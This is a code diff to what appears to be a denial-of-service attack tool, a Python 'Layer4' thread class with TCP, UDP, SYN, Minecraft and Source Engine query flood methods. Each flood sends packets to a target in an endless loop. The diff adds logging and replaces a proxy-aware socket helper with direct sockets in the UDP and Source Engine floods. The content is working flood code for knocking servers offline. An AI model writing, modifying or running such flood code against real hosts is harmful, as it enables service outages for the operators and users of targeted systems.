@@ -212,9 +212,11 @@ class Layer4(Thread):
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
+                    logger.info("~~~~~Sending request~~~~~~")
                     requests_sent += 1
                     bytes_sent += 1024
         except Exception:
+            logger.error("CAN'T SEND REQUEST")
             s.close()
 
     def MINECRAFT(self) -> None:
@@ -239,12 +241,14 @@ class Layer4(Thread):
     def UDP(self) -> None:
         global bytes_sent, requests_sent
         try:
-            with self.get_effective_socket(AF_INET, SOCK_DGRAM) as s:
+            with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
+                    logger.info("~~~~~Sending UDP request~~~~~~")
                     requests_sent += 1
                     bytes_sent += 1024
 
         except Exception:
+            logger.error("Error while sending UDP request")
             s.close()
 
     def SYN(self) -> None:
@@ -278,7 +282,7 @@ class Layer4(Thread):
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
         try:
-            with self.get_effective_socket(AF_INET, SOCK_DGRAM) as s:
+            with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(payload, self._target):
                     requests_sent += 1
                     bytes_sent += len(payload)
